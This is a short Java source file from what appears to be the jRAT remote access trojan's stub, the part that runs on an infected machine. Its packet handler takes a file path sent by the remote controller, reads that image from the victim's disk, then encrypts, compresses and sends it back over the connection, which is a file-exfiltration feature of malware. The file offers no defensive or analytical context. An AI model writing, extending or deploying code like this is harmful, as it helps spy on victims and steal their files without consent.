package se.jrat.stub.packets.incoming;

import java.awt.image.BufferedImage;
import java.io.File;

import javax.imageio.ImageIO;

import se.jrat.common.compress.GZip;
import se.jrat.common.crypto.Crypto;
import se.jrat.stub.Connection;
import se.jrat.stub.Main;
import se.jrat.stub.packets.outgoing.Packet43PreviewImage;
import se.jrat.stub.utils.ImageUtils;


public class Packet62PreviewImage extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String file = Connection.readLine();

		BufferedImage screenShot = ImageIO.read(new File(file));
		byte[] buffer = ImageUtils.encode(screenShot);
		buffer = GZip.compress(Crypto.encrypt(buffer, Main.getKey()));

		Connection.addToSendQueue(new Packet43PreviewImage(buffer.length, screenShot.getWidth(), screenShot.getHeight()));

		Connection.dos.write(buffer);

		Connection.lock();

		System.gc();

	}

}
